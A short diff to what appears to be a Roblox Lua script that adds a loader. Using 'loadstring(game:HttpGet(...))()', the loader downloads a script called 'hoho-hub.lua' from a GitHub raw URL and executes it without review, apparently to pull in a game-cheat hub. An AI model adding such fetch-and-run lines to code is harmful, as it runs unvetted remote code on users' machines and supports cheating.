@@ -83,3 +83,14 @@ if request then
 else
     warn("Request function not available!")
 end
+
+-- Load external Lua script via loadstring with error handling
+local success, result = pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/image-byte/hoho-hub/main/hoho-hub.lua', true))()
+end)
+
+if not success then
+    warn("Error executing the script via loadstring: " .. result)
+else
+    print("Script executed successfully!")
+end
